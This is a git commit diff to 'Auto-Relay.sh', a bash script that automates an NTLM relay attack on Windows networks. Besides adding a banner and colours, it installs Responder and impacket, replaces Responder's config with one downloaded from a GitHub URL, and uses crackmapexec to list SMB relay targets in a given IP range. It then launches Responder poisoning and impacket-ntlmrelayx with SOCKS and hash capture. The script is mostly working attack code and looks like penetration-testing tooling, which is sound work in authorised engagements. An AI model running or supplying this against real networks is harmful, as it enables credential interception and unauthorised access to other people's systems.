6853f95783b54b8a3ab5e63b7655ac7a2624edab
B0rk <26283277+B0rk@users.noreply.github.com>
2023-05-11 01:00:38 -0600

    Lots-O-Changes
    Changed up Colors, Fixed Errors, and Added some flavor text. Tested in Kali using Terminator. Still need to fix requiring a argument before running...

--- Auto-Relay.sh
+++ Auto-Relay.sh
@@ -1,18 +1,63 @@
 #!/bin/bash
 
-# some quick colors
-RED="\033[1;31m"
-BLUE="\033[1;34m"
-BLUE2="\033[0;34m"
-RESET="\033[0m"
+#Color Variables
+RED="\e[91m"
+GREEN="\e[32m"
+YELLOW="\e[33m"
+BLUE="\e[34m"
+RESET="\e[0m"
+ITALIC="\e[3m"
 BOLD="\e[1m"
+
+#Heading!
+echo -e "${RED}"
+echo -e "###############################################################################"
+echo -e "#${BLUE}                                                                            ${RED} #"
+echo -e "#${BLUE}                AAA                                  iiii                   ${RED} #"
+echo -e "#${BLUE}               A:::A                                i::::i                  ${RED} #"
+echo -e "#${BLUE}              A:::::A                                iiii                   ${RED} #"
+echo -e "#${BLUE}             A:::::::A                                                      ${RED} #"
+echo -e "#${BLUE}            A:::::::::A           ggggggggg   gggggiiiiiii    ooooooooooo   ${RED} #"
+echo -e "#${BLUE}           A:::::A:::::A         g:::::::::ggg::::gi:::::i  oo:::::::::::oo ${RED} #"
+echo -e "#${BLUE}          A:::::A A:::::A       g:::::::::::::::::g i::::i o:::::::::::::::o${RED} #"
+echo -e "#${BLUE}         A:::::A   A:::::A     g::::::ggggg::::::gg i::::i o:::::ooooo:::::o${RED} #"
+echo -e "#${BLUE}        A:::::A     A:::::A    g:::::g     g:::::g  i::::i o::::o     o::::o${RED} #"
+echo -e "#${BLUE}       A:::::AAAAAAAAA:::::A   g:::::g     g:::::g  i::::i o::::o     o::::o${RED} #"
+echo -e "#${BLUE}      A:::::::::::::::::::::A  g:::::g     g:::::g  i::::i o::::o     o::::o${RED} #"
+echo -e "#${BLUE}     A:::::AAAAAAAAAAAAA:::::A g::::::g    g:::::g  i::::i o::::o     o::::o${RED} #"
+echo -e "#${BLUE}    A:::::A             A:::::Ag:::::::ggggg:::::g i::::::io:::::ooooo:::::o${RED} #"
+echo -e "#${BLUE}   A:::::A               A:::::Ag::::::::::::::::g i::::::io:::::::::::::::o${RED} #"
+echo -e "#${BLUE}  A:::::A                 A:::::Agg::::::::::::::g i::::::i oo:::::::::::oo ${RED} #"
+echo -e "#${BLUE} AAAAAAA                   AAAAAAA gggggggg::::::g iiiiiiii   ooooooooooo   ${RED} #"
+echo -e "#${BLUE}                                           g:::::g                          ${RED} #"
+echo -e "#${BLUE}                               gggggg      g:::::g                          ${RED} #"
+echo -e "#${BLUE}                               g:::::gg   gg:::::g                          ${RED} #"
+echo -e "#${BLUE}                                g::::::ggg:::::::g                          ${RED} #"
+echo -e "#${BLUE}                                 gg:::::::::::::g                           ${RED} #"
+echo -e "#${BLUE}                                   ggg::::::ggg                             ${RED} #"
+echo -e "#${BLUE}                                      gggggg                                ${RED} #"
+echo -e "#${BLUE}                                                                            ${RED} #"
+echo -e "#${GREEN}                                   Auto-Relay                               ${RED} #"
+echo -e "#${BLUE}                                                                            ${RED} #"
+echo -e "#${GREEN}                              Script Version 0.1                            ${RED} #"
+echo -e "#${BLUE}                                                                            ${RED} #"
+echo -e "#${GREEN}                by ${BLUE}Kyle Hoehn ${RED}with code stealing ${GREEN}from ${BLUE}Chris McMahon         ${RED} #"
+echo -e "#${BLUE}                                                                            ${RED} #"
+echo -e "###############################################################################"
+echo -e "${RESET}"
+
+#Root Check
+if [[ $(/usr/bin/id -u) -ne 0 ]]; then
+    echo -e "[${RED}!${RESET}] Must be running as root. Quitting.\n"
+    exit
+fi
 
 #Options
 while getopts 'r:h' opt; do
   case "$opt" in
     r)
       range="$OPTARG"
-      echo -e "[${BLUE}+${RESET}] IP Range is set to '$range'"
+      echo -e "[${GREEN}+${RESET}] IP Range is set to '$range'"
       ;;
 
     h)
@@ -33,54 +78,57 @@ while getopts 'r:h' opt; do
       ;;
   esac
 done
+shift "$(($OPTIND -1))"
+
+#Variables for scripting use
+varWorkingDir="$(pwd)"
 
 #Installing dependencies if not already installed
-echo "[${BLUE}+${RESET}] Checking for application dependencies."
+echo -e "[${GREEN}+${RESET}] Checking for application dependencies."
 if command -v terminator &> /dev/null
 then
-    echo -e "[${BLUE}+${RESET}] Terminator is installed."
+    echo -e "[${GREEN}+${RESET}] Terminator is installed."
 else
 echo -e "[${RED}!${RESET}] Installing Terminator."
-sudo apt update && sudo apt install terminator -y
+apt update && apt install terminator -y
 fi
 if command -v responder &> /dev/null
 then
-    echo -e "[${BLUE}+${RESET}] Responder is installed."
+    echo -e "[${GREEN}+${RESET}] Responder is installed."
 else
 echo -e "[${RED}!${RESET}] Installing Responder."
-sudo apt update && sudo apt install responder -y
+apt update && apt install responder -y
 fi
 if command -v impacket-ntlmrelayx &> /dev/null
 then
-    echo -e "[${BLUE}+${RESET}] Impacket-Scripts is installed."
+    echo -e "[${GREEN}+${RESET}] Impacket-Scripts is installed."
 else
 echo -e "[${RED}!${RESET}] Installing Impacket-Scrpits."
-sudo apt update && sudo apt install impacket-scripts -y
+apt update && apt install impacket-scripts -y
 fi
-done
 
 #Removing original Responder Config File
-echo -e "[${BLUE}+${RESET}] Removing default Responder config file."
-sudo rm -rf /usr/share/responder/Responder.conf
+echo -e "[${GREEN}+${RESET}] Removing default Responder config file."
+rm -rf /usr/share/responder/Responder.conf
 
 #Downloading Modified Responder Config File
-echo -e "[${BLUE}+${RESET}] Downloading modified Responder config file"
-sudo curl https://raw.githubusercontent.com/B0rk/Scripts/main/Responder_Config/ntlmrelayx_responder.conf -o /usr/share/responder/Responder.conf
+echo -e "[${GREEN}+${RESET}] Downloading modified Responder config file"
+curl https://raw.githubusercontent.com/B0rk/Scripts/main/Responder_Config/ntlmrelayx_responder.conf -o /usr/share/responder/Responder.conf &> /dev/null
 
 #Sleep to allow for removal and downloading to complete.
+echo -e "[${GREEN}+${RESET}] Taking a 5 second nap to get my shit together..."
 sleep 5
 
 #Running CrackMapExec to create a relay list
-echo -e "[${BLUE}+${RESET}] Generating relay list for the ${range} IP range."
-crackmapexec smb ${range} --gen-relay-list ~/relay_targets.txt
+echo -e "[${GREEN}+${RESET}] Generating relay list for the ${range} IP range."
+crackmapexec smb ${range} --gen-relay-list ${varWorkingDir}/relay_targets.txt
 
 #Launching Responder and impacket-ntlmrelayx
-echo -e "[${BLUE}+ ${RESET}] Checking for relay list."
-if [ ! -f "~/relay_targets.txt" ]; then
-    echo "Relay file does not exist. Sorry about your luck..."
+echo -e "[${GREEN}+${RESET}] Checking for relay list."
+if [ ! -f "${varWorkingDir}/relay_targets.txt" ]; then
+  echo -e "[${RED}!${RESET}] ${RED}Relay file does not exist.${RESET} ${YELLOW}Sorry about your luck...${RESET}"
 else
-    terminator -e "sudo responder -I eth0 -w"
-    terminator -e "impacket-ntlmrelayx -tf ~/relay_targets.txt -smb2support -socks --output-file ~/ntlmrelayx_hashes.out"
+  echo -e "[${GREEN}*${RESET}] ${RED}LET THE GAMES BEGIN!${RESET}"
+  terminator -e "responder -I eth0 -w"
+  terminator -e "impacket-ntlmrelayx -tf ${varWorkingDir}/relay_targets.txt -smb2support -socks --output-file ${varWorkingDir}/ntlmrelayx_hashes.out"
 fi
-done
-exit
